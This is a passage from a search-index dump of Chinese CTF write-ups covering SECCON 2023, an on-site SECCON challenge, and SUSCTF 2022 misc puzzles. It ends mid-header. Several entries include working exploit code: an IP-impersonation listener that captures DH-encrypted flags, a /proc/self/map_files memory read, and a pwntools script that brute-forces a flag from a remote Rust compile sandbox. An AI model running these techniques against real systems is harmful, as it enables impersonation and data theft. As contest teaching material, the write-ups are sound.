\u5206\u949f\uff0c\u89e3\u9898\u524d\u4e24\u5c0f\u65f6\u624d\u4f1a\u4e0b\u53d1\u9898\u76ee\u3002</p> <p>\u76ee\u7684\u5927\u6982\u662f\u6709\u4e24\u4e2a\u8bbe\u5907 PC1 \u548c PC2\uff0c\u4e00\u4e2a\u5728\u8dd1 alice.py\uff08\u4e0b\u53d1\uff09\uff0c\u53e6\u4e00\u4e2a\u5728\u8dd1 bob.py\uff08\u672a\u77e5\uff09\uff0c\u4e2d\u95f4\u901a\u8fc7\u7f51\u7ebf\u8fde\u63a5\u3002\u8981\u6c42\u662f\u4ec5\u80fd\u63a5\u89e6\u7f51\u7ebf\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u8981\u5f97\u5230 Alice \u901a\u8fc7 socket \u8fde\u63a5\u53d1\u9001\u51fa\u53bb\u7684\u4e24\u4e2a flag\uff0c\u7b2c\u4e00\u4e2a\u662f\u660e\u6587\uff0c\u7b2c\u4e8c\u4e2a\u4f1a\u7ecf\u8fc7\u516c\u94a5\u4ea4\u6362\u52a0\u5bc6\u3002\u73b0\u573a\u4f1a\u63d0\u4f9b\u4ea4\u6362\u673a\u3001\u7f51\u7ebf\u3001\u6c34\u6676\u5934\u3001\u526a\u7ebf\u8bbe\u5907\u3002</p> <p>\u7b2c\u4e00\u60f3\u6cd5\u662f\u62c9\u8fc7\u6765\u76d1\u542c\u6d41\u91cf\uff0c\u4f46\u56e0\u4e3a\u662f socket \u8fd8\u8981\u4fdd\u6301\u4e0e Bob \u7684\u8fde\u63a5\uff0c\u6709\u70b9\u9ebb\u70e6\u3002\u800c\u4e14\u7b2c\u4e8c\u4e2a flag \u8fd8\u8981\u5229\u7528\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4e5f\u662f\u9ebb\u70e6\u3002</p> <p>\u6362\u4e2a\u601d\u8def\uff0cAlice \u548c Bob \u901a\u8fc7 socket \u76f4\u63a5\u8fde\u63a5\uff0c\u8bbf\u95ee\u662f\u57fa\u4e8e ip \u786e\u5b9a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u80fd\u4f2a\u9020 ip\uff0c\u8ba9 Alice \u4ee5\u4e3a\u6211\u4eec\u5c31\u662f Bob\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u901a\u4fe1\u5b8c\u7f8e\u62ff\u5230 flag\u3002</p> <p>\u4ea4\u6362\u673a\u578b\u53f7 NETGEAR ProSafe Plus GS105Ev2\uff0c\u53ef\u4ee5\u67e5\u5230\u76f8\u5173\u4f7f\u7528\u624b\u518c\u3002</p> <p>\u5230\u73b0\u573a\u540e\u9996\u5148\u8981\u5b8c\u6210\u7684\u5c31\u662f\u526a\u7ebf+\u63a5\u6c34\u6676\u5934\uff0c\u9898\u76ee\u91cc\u8bf4\u4e86\u4f7f\u7528\u7684\u662f T568A \u63a5\u7ebf\u65b9\u5f0f\uff0c\u7ed9 Alice \u90a3\u4e00\u4fa7\u989c\u8272\u6392\u597d\u63a5\u597d\u6c34\u6676\u5934\u63d2\u5728\u4ea4\u6362\u673a\u4e0a\uff08\u8fd8\u4e0d\u80fd\u6d4b\u8bd5\uff0c\u63a5\u6c34\u6676\u5934\u6548\u679c\u4e5f\u6ca1\u529e\u6cd5\u9a8c\u8bc1\uff09\uff0c\u53e6\u5916\u518d\u63a5\u4e00\u6839\u7ebf\u5230\u81ea\u5df1\u7535\u8111\u4e0a\u3002\u6309\u7167\u624b\u518c\u6307\u5bfc\u6253\u5f00\u8def\u7531\uff0c\u914d\u7f6e\u597d\u9759\u6001 ip \u5373\u53ef\uff0c\u8fd9\u65f6\u672c\u673a\u7684 ip \u5c31\u53ef\u4ee5\u8bbe\u7f6e\u4e3a Bob \u7684 192.168.1.103\uff0cping \u4e00\u4e0b Alice 102 \u4e5f\u80fd ping \u901a\u3002\u7136\u540e\u8dd1\u4e00\u4e0b\u9884\u5148\u5199\u597d\u7684 exp \u5c31\u80fd\u76f4\u63a5\u62ff\u5230\u4e24\u4e2a flag \u4e86\uff1a</p> <pre><code>import base64\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.asymmetric import dh\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.fernet import Fernet\nimport os\nimport socket\nimport struct\nimport time\n\ndef send_bytes(sock, data):\n    assert len(data) &lt; 0x10000\n    sock.send(struct.pack('&lt;H', len(data)))\n    sock.send(data)\n\ndef recv_bytes(sock):\n    size = struct.unpack('&lt;H', sock.recv(2))[0]\n    return sock.recv(size)\n\np = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF\ng = 2\n\nparameters = dh.DHParameterNumbers(p, g).parameters(default_backend())\npriv = parameters.generate_private_key()\npub2 = priv.public_key()\npub_bytes = pub2.public_bytes(\n    encoding=serialization.Encoding.PEM,\n    format=serialization.PublicFormat.SubjectPublicKeyInfo\n)\n\naddress = ('0.0.0.0', 12345)\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\nserver.bind(address)\nserver.listen(5)\n\nprint(\"[+] Listening on {}:{}\".format(*address))\nwhile True:\n    client, addr = server.accept()\n    print('[+] FLAG1:', recv_bytes(client))\n    pub = recv_bytes(client)\n    send_bytes(client, pub_bytes)\n    buf2 = recv_bytes(client)\n    pub1 = serialization.load_pem_public_key(pub)\n    shared = priv.exchange(pub1)\n    digest = hashes.Hash(hashes.SHA256())\n    digest.update(shared)\n    key = base64.urlsafe_b64encode(digest.finalize()[:32])\n    f = Fernet(key)\n    print('[+] FLAG2:', f.decrypt(buf2))\n    client.close()\n</code></pre> <p>flag1: SECCON{c4bl3_ch0k1ch0k1}\u3001flag2: SECCON{DH_1s_n0t_s4f3_4g41n5t_p4ck3t_m4n1pul4t10n}</p>"}, {"location": "writeups/seccon2023/", "title": "SECCON CTF 2023 Quals Writeup", "text": "<p> \u7ea6 810 \u4e2a\u5b57  133 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u7b2c\u4e8c\u6b21\u6253 SECCON\uff0c\u65f6\u95f4\u6bd4\u53bb\u5e74\u65e9\uff0cmisc \u9898\u76ee\u6bd4\u8f83\u5c11\uff0c\u540e\u9762\u8fd8\u770b\u4e86\u70b9 pwn\u3002</p> <p>24h \u6bd4\u8d5b\uff0c\u6253\u4e86\u7b2c\u4e09\uff0c\u8fdb\u51b3\u8d5b\u4e86\u3002</p>"}, {"location": "writeups/seccon2023/#readme-2023", "title": "Readme 2023", "text": "\u9898\u76ee\u6e90\u7801 <pre><code>import mmap\nimport os\nimport signal\n\nsignal.alarm(60)\n\ntry:\n    f = open(\"./flag.txt\", \"r\")\n    mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)\nexcept FileNotFoundError:\n    print(\"[-] Flag does not exist\")\n    exit(1)\n\nwhile True:\n    path = input(\"path: \")\n\n    if 'flag.txt' in path:\n        print(\"[-] Path not allowed\")\n        exit(1)\n    elif 'fd' in path:\n        print(\"[-] No more fd trick ;)\")\n        exit(1)\n\n    with open(os.path.realpath(path), \"rb\") as f:\n        print(f.read(0x100))\n</code></pre> <p>\u5f88\u6709 SECCON \u5473\u9053\u7684\u4e00\u9053\u9898\uff0c\u9898\u76ee\u6e90\u7801\u5c31\u662f\u5f88\u7b80\u5355\u7684 python\u3002</p> <p>\u8fd9\u91cc mmap.mmap \u5c31\u662f\u8c03\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5c06 flag.txt \u6620\u5c04\u5230\u4e86\u5185\u5b58\u4e2d\u3002\u7136\u540e\u63d0\u4f9b\u4e86\u4efb\u610f\u6587\u4ef6\u5934 0x100 \u5b57\u8282\u7684\u8bfb\u53d6\uff0c\u8981\u6c42\u6587\u4ef6\u8def\u5f84\u4e2d\u4e0d\u80fd\u5305\u542b flag.txt \u548c fd\u3002</p> <p>\u6240\u4ee5\u601d\u8def\u5c31\u662f\u901a\u8fc7 proc \u6587\u4ef6\u7cfb\u7edf\u6765\u5c1d\u8bd5\u8bfb\u53d6\u5185\u5b58\u3002\u5982\u679c\u6ca1\u6709 0x100 \u5b57\u8282\u7684\u9650\u5236\u7684\u8bdd\u5c31\u53ef\u4ee5\u76f4\u63a5\u5728 /proc/self/maps \u4e2d\u8bfb\u53d6 flag.txt \u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u901a\u8fc7 /proc/self/map_files/... \u8fdb\u884c\u8bfb\u53d6\u3002</p> <p>\u4f46\u5b9e\u9645\u4e0a maps \u8f93\u51fa\u4e0d\u5230 flag.txt \u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u5c31\u8981\u60f3\u4e00\u4e9b\u5176\u4ed6\u529e\u6cd5\u6765\u5f97\u5230\u5b83\u7684\u5730\u5740\u3002\u6620\u5c04\u540e\u7684\u5730\u5740\u662f\u5728 libc \u540e\u7684\uff0c\u6240\u4ee5\u5b83\u76f8\u5bf9\u4e8e libc \u57fa\u5740\u7684\u504f\u79fb\u5e94\u8be5\u662f\u6052\u5b9a\u7684\u3002\u6240\u4ee5\u5c31\u53d8\u6210\u4e86\u5f97\u5230 libc \u5730\u5740\u7684\u95ee\u9898\u4e86\u3002</p> <p>maps \u8fd8\u662f\u8f93\u51fa\u4e0d\u5230 libc\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 /proc/self/syscall \u6765\u67e5\u770b\u5f53\u524d\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u56e0\u4e3a\u4e00\u76f4\u5728\u7b49\u5f85\u8f93\u5165\uff0c\u6240\u4ee5\u4e00\u76f4\u6709\u4e00\u6761 read \u7684 syscall\uff0c\u5b83\u8f93\u51fa\u7684\u6700\u540e\u4e00\u4e2a\u503c\u5c31\u662f pc\uff0c\u4e5f\u662f\u5728 libc \u4e2d\u7684\uff0c\u6240\u4ee5\u672c\u5730 docker \u8dd1\u51e0\u6b21\u8ba1\u7b97\u4e00\u4e0b\u504f\u79fb\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>path: /proc/self/syscall\nb'0 0x7 0x55ad83fc2580 0x1000 0x2 0x0 0x0 0x7fff44d48b38 0x7fcbe603607d\\n'\n# 0x7fcbe603607d -&gt; 0x7fcbe6120000 \u504f\u79fb 958339\n</code></pre> <pre><code>path: /proc/self/syscall\nb'0 0x7 0x563f1e8376b0 0x400 0x2 0x0 0x0 0x7ffe63b78728 0x7f20e9db807d\\n'\npath: /proc/self/map_files/7f20e9ea2000-7f20e9ea3000\nb'SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}\\n'\n</code></pre>"}, {"location": "writeups/seccon2023/#crabox", "title": "crabox", "text": "\u9898\u76ee\u6e90\u7801 <pre><code>import sys\nimport re\nimport os\nimport subprocess\nimport tempfile\n\nFLAG = os.environ[\"FLAG\"]\nassert re.fullmatch(r\"SECCON{[_a-z0-9]+}\", FLAG)\nos.environ.pop(\"FLAG\")\n\nTEMPLATE = \"\"\"\nfn main() {\n    {{YOUR_PROGRAM}}\n\n    /* Steal me: {{FLAG}} */\n}\n\"\"\".strip()\n\nprint(\"\"\"\n\ud83e\udd80 Compile-Time Sandbox Escape \ud83e\udd80\n\nInput your program (the last line must start with __EOF__):\n\"\"\".strip(), flush=True)\n\nprogram = \"\"\nwhile True:\n    line = sys.stdin.readline()\n    if line.startswith(\"__EOF__\"):\n        break\n    program += line\nif len(program) &gt; 512:\n    print(\"Your program is too long. Bye\ud83d\udc4b\".strip())\n    exit(1)\n\nsource = TEMPLATE.replace(\"{{FLAG}}\", FLAG).replace(\"{{YOUR_PROGRAM}}\", program)\n\nwith tempfile.NamedTemporaryFile(suffix=\".rs\") as file:\n    file.write(source.encode())\n    file.flush()\n\n    try:\n        proc = subprocess.run(\n            [\"rustc\", file.name],\n            cwd=\"/tmp\",\n            stdout=subprocess.DEVNULL,\n            stderr=subprocess.DEVNULL,\n            timeout=2,\n        )\n        print(\":)\" if proc.returncode == 0 else \":(\")\n    except subprocess.TimeoutExpired:\n        print(\"timeout\")\n</code></pre> <p>\u5728 Sandbox \u5206\u7c7b\u91cc\u7684\u4e00\u9053\u9898\uff0c\u6bd4\u8f83 misc\uff0c\u8003\u5bdf\u7684\u662f Rust \u7f16\u8bd1\u65f6\u5b8f\u7684\u4f7f\u7528\u3002</p> <p>\u9898\u76ee\u5927\u610f\u5c31\u662f\u5728\u63d0\u4f9b\u7684\u6a21\u677f\u4e2d\u63d2\u5165 Rust \u4ee3\u7801\uff0c\u5e76\u4e14\u91cc\u9762\u6709\u6ce8\u91ca\u7684 flag\uff0cserver \u53ea\u4f1a\u7f16\u8bd1\u8fd9\u4efd\u4ee3\u7801\u5e76\u544a\u8bc9\u4f60\u662f\u5426\u7f16\u8bd1\u6210\u529f\uff08\u65e0\u4efb\u4f55\u989d\u5916\u4fe1\u606f\uff09\u3002</p> <p>\u6240\u4ee5\u76ee\u6807\u4e5f\u5f88\u660e\u786e\uff0c\u5c31\u662f\u8981\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u6cc4\u6f0f\u51fa flag \u5185\u5bb9\u3002\u4ee5\u53ca\u53ea\u4f1a\u7f16\u8bd1\u4e0d\u4f1a\u8fd0\u884c\uff0c\u80fd\u5728\u7f16\u8bd1\u65f6\u8fdb\u884c\u7684\u64cd\u4f5c\u4e5f\u5c31\u662f\u5b8f\u4e86\u3002\u800c\u4e14 Rust \u4e2d\u8fc7\u7a0b\u5b8f\u53ea\u80fd\u5728\u4e00\u4e2a\u72ec\u7acb\u7684 lib crate \u4e2d\u7f16\u5199\uff0c\u4e0d\u80fd\u5728\u540c\u4e00\u6587\u4ef6\u4e2d\u7f16\u5199\u5e76\u4f7f\u7528\u8fc7\u7a0b\u5b8f\uff0c\u6240\u4ee5\u80af\u5b9a\u8981\u7528\u58f0\u660e\u5f0f\u5b8f\u3002</p> <p>\u6700\u521d\u7684\u60f3\u6cd5\u662f\u5229\u7528\u5b8f\u8c03\u7528\u62ec\u53f7\u53ef\u4ee5\u662f\u5927\u62ec\u53f7\u7684\u7279\u6027\u6765\u5c06\u5e26\u6709 flag \u7684\u6ce8\u91ca\u4f20\u5165\u5b8f\u4e2d\u8fdb\u884c\u5339\u914d\u5904\u7406\u3002\u4f46\u662f\u5b9e\u9645\u64cd\u4f5c\u53d1\u73b0\u5728\u8fd9\u4e2a\u65f6\u5019\u6ce8\u91ca\u5c31\u5df2\u7ecf\u88ab\u66ff\u6362\u6389\u4e86\uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u7684\u53c2\u6570\u662f\u7a7a\u7684\u800c\u4e0d\u662f\u4e00\u4e2a\u6ce8\u91ca\u3002</p> <p>\u6240\u4ee5\u5269\u4e0b\u7684\u65b9\u6cd5\u5c31\u662f\u76f4\u63a5\u8bfb\u53d6\u5f53\u524d\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>file!()</code> \u5b8f\u83b7\u53d6\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u4f7f\u7528 <code>include_str!()</code> \u5728\u7f16\u8bd1\u65f6\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002\u63a5\u4e0b\u6765\u8981\u5b9e\u73b0\u7684\u5c31\u662f\u7f16\u8bd1\u65f6\u7684 assert\uff0c\u53ef\u4ee5\u67e5\u5230\u4e00\u79cd\u5199\u6cd5\u662f\u53ef\u4ee5\u7528\u7684\uff1a</p> <pre><code>macro_rules! compile_time_assert {\n    ($condition:expr, $message:expr) =&gt; {\n        const _: [(); 0 - !($condition) as usize] = [];\n    };\n}\ncompile_time_assert!(..., \"\");\n</code></pre> <p>\u63a5\u4e0b\u6765\u8981\u89e3\u51b3\u7684\u5c31\u662f\u8bfb\u53d6\u6587\u4ef6\u4e2d\u4efb\u610f\u4f4d\u7f6e\u7684\u5185\u5bb9\uff0c\u5982\u679c\u662f\u76f4\u63a5\u5207\u7247\u7684\u8bdd\u662f\u4e0d\u53ef\u80fd\u5f97\u5230 const \u7684\uff0c\u4e0d\u80fd\u5728\u7f16\u8bd1\u65f6\u8fd9\u4e48\u641e\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u6307\u5411\u6587\u4ef6\u5185\u5bb9\u7684\u88f8\u6307\u9488\u6765\u64cd\u4f5c\uff0c\u5373\u6574\u4e2a\u7a0b\u5e8f\u5982\u4e0b\uff1a</p> <pre><code>fn main() {\n    const PTR: *const u8 = unsafe{ include_str!(file!()).as_ptr().offset(...) };\n    macro_rules! compile_time_assert {\n        ($condition:expr, $message:expr) =&gt; {\n            const _: [(); 0 - !($condition) as usize] = [];\n        };\n    }\n    compile_time_assert!(unsafe{ *(PTR) } == '?' as u8, \"\");\n\n    /* Steal me: SECCON{dummy} */\n}\n</code></pre> <p>\u8fd9\u6837\u53ea\u6709\u5bf9\u5e94 offset \u662f\u7ed9\u5b9a\u7684\u5b57\u7b26\u624d\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\uff0c\u5426\u5219\u4e0d\u884c\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u901a\u8fc7 flag \u4e2d\u7684\u5927\u5199\u5b57\u6bcd\u6765\u5f97\u5230 flag \u5185\u5bb9\u5bf9\u5e94\u7684 offset\uff0c\u7136\u540e\u9010\u4f4d\u679a\u4e3e\u53ef\u884c\u5b57\u7b26\u8fdb\u884c\u7206\u7834\u5c31\u53ef\u4ee5\u4e86\u3002</p> exp <pre><code>from pwn import *\n\n# context(log_level=\"debug\")\n\ntemp = \"\"\"\nconst PTR: *const u8 = unsafe{include_str!(file!()).as_ptr().offset(__OFFSET__)};\n    const COS: &amp;str = include_str!(file!());\n    macro_rules! compile_time_assert {\n        ($condition:expr, $message:expr) =&gt; {\n            const _: [(); 0 - !($condition) as usize] = [];\n        };\n    }\n    compile_time_assert!(unsafe{*(PTR)} == __ASCII__, \"1\");\n__EOF__\n\"\"\".strip()\n\noffset = 378\ncharset = \"_abcdefghijklmnopqrstuvwxyz0123456789\"\nflag = \"SECCON{\"\n\nfor i in range(0, 17):\n    for char in charset:\n        c = str(ord(char))\n        length = len(c)\n        payload = temp.replace(\"__OFFSET__\", str(offset + i)).replace(\"__ASCII__\", c if length == 3 else c + \" \")\n        p = remote(\"crabox.seccon.games\", 1337)\n        p.sendlineafter(b\"):\\n\", payload.encode())\n        res = p.recvline()\n        if b\":)\" in res:\n            flag += char\n            print(flag)\n            break\n        p.close()\n</code></pre> <p>flag: SECCON{ctfe_i5_p0w3rful}</p>"}, {"location": "writeups/susctf2022/", "title": "SUSCTF 2022 Writeup", "text": "<p> \u7ea6 496 \u4e2a\u5b57  83 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u6b21\u7684 misc \u9898\u8d28\u91cf\u4e0d\u9ad8\uff0c\u96be\u5ea6\u5206\u5212\u4e25\u91cd\uff0cAK \u4e86\uff0c\u5199\u4e00\u4e0b</p>"}, {"location": "writeups/susctf2022/#ra2", "title": "ra2", "text": "<p>\u7ea2\u8b66\u81ea\u5236\u5173\u5361\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6e38\u620f\u81ea\u5e26\u7684 Extras \u2192 map editor\uff0c\u5373\u53ef\u8fdb\u5165\u770b\u5230\u5730\u56fe\u4e2d\u7684 lunar flag \u548c billboard</p> <p></p> <p>\u5176\u4e2d billboard \u4e0a\u64ad\u653e\u7684\u5c31\u662f\u4e09\u5e27 flag</p> <p>\u6216\u8005\u53ef\u4ee5\u627e\u5230\u6e38\u620f\u6587\u4ef6\u5939 mods/rv/maps/ctf-01\uff0c\u4fee\u6539\u5176\u4e2d\u63a7\u5236\u6e38\u620f\u903b\u8f91\u7684 lua \u6587\u4ef6\uff0c\u5c06\u96be\u5ea6\u964d\u4f4e\uff0c\u53ef\u4ee5\u8fdb\u5165\u6e38\u620f\u627e\u5230 flag</p> <p>flag: SUSCTF{RED_ALERT_WINNER!!!}</p>"}, {"location": "writeups/susctf2022/#tanner", "title": "Tanner", "text": "<p>Tanner \u56fe\uff0cLDPC \u7801\uff0c\u53d1\u73b0\u6587\u4ef6\u5c3e\u6709\u6240\u6c42\u5185\u5bb9\uff1a</p> <pre><code>THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front)\n</code></pre> <p>\u5373\u6c42\u6240\u6709\u6ee1\u8db3\u8fd9\u4e2a LDPC \u6821\u9a8c\u7801\u7684\u6240\u6709\u6bd4\u7279\u5e8f\u5217\u52a0\u8d77\u6765\u4e4b\u540e\u7684\u503c\u7684 sha256</p> <p>\u4ece\u7f51\u4e0a\u968f\u4fbf\u627e\u4e86\u4e2a decoder \u6765\u7528\uff1ahttp://leohope.com/\u89e3\u95ee\u9898/2019/01/11/ldpc-with-python/</p> <p>\u968f\u610f\u4f20\u5165\u4e00\u4e2a\u6bd4\u7279\u5e8f\u5217\uff0c\u5982\u679c\u5b83\u89e3\u51fa\u6765\u7684\u5e8f\u5217\u6ca1\u6709\u53d8\u5316\uff0c\u5219\u8bf4\u660e\u5f53\u524d\u5e8f\u5217\u6ee1\u8db3\u9700\u8981</p> <p>\u4e00\u5171 10 \u4e2a\u6bd4\u7279\uff0c1024 \u79cd\u60c5\u51b5\uff0c\u679a\u4e3e\u5373\u53ef\uff1a</p> <pre><code>import hashlib\nimport numpy as np\n\ndef decode(H, y, m, n, p):\n    fr = np.zeros((m, 2 * p))\n    fs = np.zeros((m, 2 * p))\n    sum = np.zeros(m)\n    c = np.zeros((n, p+2))\n    y1 = np.zeros(n)\n\n    for i in range(m):\n        count = 0\n        for j in range(n):\n            if H[i][j] == 1:\n                fr[i, count] = y[j]\n                sum[i] = sum[i]+y[j]\n                count = count+1\n\n    for i in range(m):\n        for j in range(2*p):\n            fs[i, j] = (sum[i]-fr[i, j]) % 2\n\n    for i in range(m):\n        count = 0\n        for j in range(n):\n            if H[i][j] == 1:\n                index = int(c[j, p+1])\n                c[j, index] = fs[i, count]\n                count = count+1\n                c[j, p+1] += 1\n\n    for i in range(n):\n        c[i, p] = y[i]\n\n    for i in range(n):\n        count = 0\n        for j in range(p+1):\n            if c[i, j] == 1:\n                count += 1\n        if count &gt; (p+1)/2:\n            y1[i] = 1\n    return y1\n\nm = 5\nn = 10\np = 2\n\nH = np.zeros((5, 10))\nH = [[1, 1, 1, 1, 0, 0, 0, 0, 0, 0],\n     [1, 0, 0, 0, 1, 1, 1, 0, 0, 0],\n     [0, 1, 0, 0, 1, 0, 0, 1, 1, 0],\n     [0, 0, 1, 0, 0, 1, 0, 1, 0, 1],\n     [0, 0, 0, 1, 0, 0, 1, 0, 1, 1]]\n\nans = 0\nfor i in range(1024):\n    bi = f\"{bin(i)[2:]:&gt;010}\"\n    lst = list(map(int, bi))\n    res = decode(H, lst, m, n, p)\n    if all(lst == res):\n        ans += i\nprint(hashlib.sha256(bin(ans)[2:].encode(\"utf-8\")).hexdigest())\n# c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1\n</code></pre> <p>flag: SUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1}</p>"}, {"location": "writeups/susctf2022/#audio", "title": "AUDIO", "text": "<p>\u97f3\u9891\u9690\u5199\uff0c\u5df2\u7ecf\u7ed9\u4e86\u4fee\u6539\u540e\u7684\u6587\u4ef6\u548c\u539f\u6587\u4ef6\uff0c\u80af\u5b9a\u8981\u6bd4\u8f83\u5f02\u540c\uff0c\u76f4\u63a5\u5728 Au \u91cc\u8fdb\u884c\u64cd\u4f5c</p> <p>\u5148\u5339\u914d\u54cd\u5ea6\uff0c\u7136\u540e\u7ed9\u4e00\u6bb5\u97f3\u9891\u53cd\u76f8\uff0c\u4e4b\u540e\u4e24\u6bb5\u97f3\u9891\u8fdb\u884c\u591a\u8f68\u6df7\u97f3\uff0c\u8fd9\u6837\u76f8\u540c\u90e8\u5206\u4f1a\u62b5\u6d88\u6389</p> <p>\u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u542c\u5230\u4e2d\u95f4\u6709\u4e00\u6bb5\u6ef4\u6ef4\u58f0\uff0c\u662f\u6469\u5c14\u65af\u7535\u7801\uff0c\u6284\u5199\u7ffb\u8bd1\uff1a <pre><code>... ..- ... -.-. - ..-. -- .- ... - . .-. --- ..-. .- ..- -.. .. ---\n</code></pre></p> <p><code>SUSCTFMASTEROFAUDIO</code></p> <p>flag: SUSCTF{MASTEROFAUDIO}</p>"}, {"location": "writeups/susctf2022/#misound", "title": "misound", "text": "<p>\u97f3\u9891\uff0c\u660e\u663e\u662f SSTV\uff0c\u4f46\u662f\u4e2d\u95f4\u7a7f\u63d2\u4e86\u6742\u4e71\u7684\u97f3\u9891\uff0c\u88c1\u526a\u51fa\u6765\uff1a</p> <p></p> <pre><code>AnEWmuLTiPLyis_etimes_wiLLbEcomE_B\n</code></pre> <p>\u518d\u6839\u636e hint\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u65b0\u4e58\u6cd5\u8fd0\u7b97 _e * _ = _B \u610f\u4e49\u4e0d\u660e</p> <p>\u518d\u628a wav \u4f20\u5165 SilentEye\uff0c\u5f97\u5230\uff1a</p> <pre><code>MjA3IDM1OSAyMjAgMjI0IDM1MiAzMTUgMzU5IDM3NCAyOTAgMzEwIDI3NyA1MDcgMzkxIDUxMyA0MjMgMzkyIDUwOCAzODMgNDQwIDMyMiA0MjAgNDI3IDUwMyA0NjAgMjk1IDMxOCAyNDUgMzAyIDQwNyA0MTQgNDEwIDEzMCAzNjkgMzE3\n</code></pre> <p>base64 \u89e3\u7801\uff1a</p> <pre><code>207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317\n</code></pre> <p>\u4e09\u5341\u56db\u4e2a\u6570\u5b57\uff0c\u5bf9\u5e94\u524d\u9762\u7684\u5b57\u7b26\u4e32\u662f\u4e09\u5341\u56db\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u662f\u8fdb\u884c\u4e86\u67d0\u4e9b\u64cd\u4f5c</p> <p>\u7136\u540e\u80fd\u786e\u5b9a\u7684\u662f flag \u5f00\u5934\u7ed3\u5c3e\u662f <code>SUSCTF{</code> \u548c <code>}</code></p> <p>\u8fdb\u884c\u6f2b\u957f\u7684\u8fd0\u7b97\u548c\u731c\u6d4b\uff0c\u6700\u540e\u53d1\u73b0 AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u8fd9\u4e2a\u5b57\u7b26\u4e32\u9010\u5b57\u7b26\u4e58 flag \u540e\u503c\u7684\u53d8\u5316\u8d8b\u52bf\u548c\u524d\u9762 SilentEye \u7ed3\u679c\u7684\u8d8b\u52bf\u76f8\u540c\uff0c\u628a\u5df2\u77e5\u7684\u5199\u4e0b\u6765\uff0c\u8fdb\u884c\u7ebf\u6027\u56de\u5f52\u62df\u5408</p> <pre><code>207, 5395\n359, 9350\n220, 5727\n224, 5829\n352, 9156\n315, 8190\n359, 9348\n317, 8250\n</code></pre> <p></p> F(x) = 26.011670619246555*x+4.942379114107098 <pre><code>&gt;&gt;&gt; def f(x):\n...     return 26.011670619246555*x+4.942379114107098\n...\n&gt;&gt;&gt; for x, y in zip([207, 359, 220, 224, 352, 315, 359, 374, 290, 310, 277, 507, 391, 513, 423, 392, 508, 383, 440, 322, 420, 427, 503, 460, 295, 318, 245, 302, 407, 414, 410, 130, 369, 317], [65, 110, 69, 87, 109, 117, 76, 84, 105, 80, 76, 121, 105, 115, 95, 101, 116, 105, 109, 101, 115, 95, 119, 105, 76, 76, 98, 69, 99, 111, 109, 69, 95, 66]):\n...     print(chr(round(f(x) / y)), end=\"\")\n...\nSUSCTF{tHe_matter_iS_unremArkab1e}\n</code></pre> <p>flag: SUSCTF{tHe_matter_iS_unremArkab1e}</p>"}, {"location": "writeups/sysu_msc_puzzle/", "title": "SYSU MSC Puzzle 2021 Writeup", "text": "<p> \u7ea6 1953 \u4e2a\u5b57  181 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>MSC Puzzle \u662f\u7531\u4e2d\u5c71\u5927\u5b66 MSClub \u4e0e\u4e2d\u5c71\u5927\u5b66 W4terDr0p \u6218\u961f\u8054\u5408\u4e3e\u529e\u7684\u8da3\u5473\u6027\u89e3\u8c1c\u6e38\u620f</p> <p>Abstract</p> <p>\u57fa\u672c\u4e0a\u90fd\u662f GZTime \u51fa\u7684\u9898\uff0c\u7b97\u5230 CTF \u91cc\u5c31\u90fd\u662f misc \u7c7b\uff0c\u4e00\u5171 24 \u9053\u9898\uff0c\u4e0b\u9762\u662f\u7b80\u8981\u7684 